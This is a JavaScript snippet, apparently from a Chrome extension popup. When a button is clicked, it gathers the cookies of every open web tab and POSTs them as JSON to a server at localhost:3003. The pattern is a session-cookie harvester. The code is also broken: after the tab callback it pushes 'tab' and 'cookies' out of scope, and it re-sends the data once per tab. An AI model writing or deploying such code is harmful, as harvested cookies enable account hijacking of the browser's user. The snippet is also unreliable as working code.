document.getElementById('fetchCookies').addEventListener('click', () => {
  chrome.permissions.request({ permissions: ['tabs'] }, (granted) => {
    if (granted) {
      chrome.tabs.query({}, function (tabs) {
        const allCookies = [];

        tabs.forEach((tab) => {
          if (
            tab.url &&
            (tab.url.startsWith('http://') || tab.url.startsWith('https://'))
          ) {
            chrome.cookies.getAll({ url: tab.url }, function (cookies) {
              console.log(`Cookies for ${tab.url}:`);
              console.log(cookies);

              allCookies.push({
                url: tab.url,
                cookies: cookies,
              });

              // Convert allCookies to JSON
              const jsonData = JSON.stringify(allCookies);

              console.log(jsonData);
              fetch('http://localhost:3003/submit', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json', // Ensure the correct content type
                },
                body: JSON.stringify({ data: jsonData }), // Ensure it's wrapped in an object
              })
                .then((res) => res.json()) // Call the json method
                .then((data) => {
                  console.log(data);
                })
                .catch((error) => {
                  console.error('Error fetching:', error); // Catch fetch errors
                });
            });
          } else {
            console.log(`Skipping tab with invalid URL: ${tab.url}`);
          }
        });
      });

      allCookies.push({
        url: tab.url,
        cookies: cookies,
      });
    } else {
      console.log('Permission to access tabs was denied.');
    }
  });
});
